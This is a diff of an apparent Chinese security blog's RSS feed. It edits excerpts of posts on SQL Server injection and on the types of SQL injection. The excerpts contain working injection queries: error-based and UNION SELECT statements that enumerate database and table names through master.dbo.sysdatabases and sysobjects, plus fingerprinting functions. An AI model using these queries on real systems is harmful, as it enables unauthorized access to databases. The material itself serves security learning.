@@ -53,7 +53,7 @@ py一下了吧，前端有js进行加密，可以本地写文件生成加密后�
       <pubDate>Tue, 04 Sep 2018 10:09:17 +0800</pubDate>
       
       <guid>http://wyb0.com/posts/2018/injection-tips-of-sqlserver/</guid>
-      <description>0x00 基础信息探测 @@VERSION,@@SERVERNAME,@@SERVICENAME; --Microsoft SQL Server 2008 (RTM) - 10.0.1600.22 (X64) --WIN-2008 --MSSQLSERVER USER,CURRENT_USER,SESSION_USER,SYSTEM_USER; --dbo --dbo --dbo --sa USER_NAME(),HOST_NAME(),HOST_ID(),SUSER_NAME(); --dbo --wyb --46530 --sa USER_ID(),USER_SID(); --1 --&amp;lt;01&amp;gt; ORIGINAL_LOGIN(); --sa  0x01 判断是否为sa权限 0x02 报错注入  得到所有数据库名字 --报错得到数据库名，前6个是系统自带的数据库，所以从第7个开始，dbid依次增加即可得到所有数据库 select id,name from msg where id=1 and 0&amp;lt;&amp;gt;(select name from master.dbo.sysdatabases where dbid=7);   得到数据库test的所有表名（用户创建的表xtype的值是U）   --得到数据库test的第一张表 select id,name from msg where id=-1 union select top 1 id,name from test.dbo.sysobjects where xtype=&#39;U&#39;; --得到数据库test的第二张表 select id,name from msg where id=-1 union select top 1 id,name from test.</description>
+      <description>0x00 基础信息探测 @@VERSION,@@SERVERNAME,@@SERVICENAME; --Microsoft SQL Server 2008 (RTM) - 10.0.1600.22 (X64) --WIN-2008 --MSSQLSERVER USER,CURRENT_USER,SESSION_USER,SYSTEM_USER; --dbo --dbo --dbo --sa USER_NAME(),HOST_NAME(),HOST_ID(),SUSER_NAME(); --dbo --wyb --46530 --sa USER_ID(),USER_SID(); --1 --&amp;lt;01&amp;gt; ORIGINAL_LOGIN(); --sa  0x01 报错注入  判断是否为sa权限  得到所有数据库名字 --报错得到数据库名，前6个是系统自带的数据库，所以从第7个开始，dbid依次增加即可得到所有数据库 select id,name from msg where id=1 and 0&amp;lt;&amp;gt;(select name from master.dbo.sysdatabases where dbid=7);   得到数据库test的所有表名（用户创建的表xtype的值是U）   --得到数据库test的第一张表 select id,name from msg where id=-1 union select top 1 id,name from test.dbo.sysobjects where xtype=&#39;U&#39;; --得到数据库test的第二张表 select id,name from msg where id=-1 union select top 1 id,name from test.</description>
     </item>
     
     <item>
@@ -223,8 +223,8 @@ use test; 选择数据库为test create table aaa(bbb varchar(64)); 在数据库
 只要页面有显示位即可使用，且注入速度很快 Error-based SQL injection(报错型注入)
 没有显示位但用echo &amp;ldquo;mysql_error()&amp;ldquo;输出了错误信息，速度很快，但是语句较复杂 Boolean-based blind SQL injection(布尔型注入)
 一次一个字节，速度慢，但只要有注入就能用 Time-based blind SQL injection(基于时间延迟注入)
-超级慢，比布尔型注入慢几倍，但是通用性较强 Stacked queries SQL injection(堆叠注入/可多语句查询注入)
-只有SQL Server可以使用  根据类型
+超级慢，比布尔型注入慢几倍，但是通用性较强 Stacked queries SQL injection(堆叠注入)
+只有SQL Server可以使用(可多语句查询注入)  根据类型
  整形
 形如&amp;quot;a.asp?ID=55&amp;quot;，这类注入的参数是&amp;rdquo;数字&amp;rdquo;，因此称为&amp;rdquo;数字型注入点&amp;rdquo;。 字符串型
 形如&amp;quot;b.asp?name=xiaoming&amp;quot;这类注入的参数是&amp;rdquo;字符&amp;rdquo;，称为&amp;rdquo;字符型&amp;rdquo;注入点。
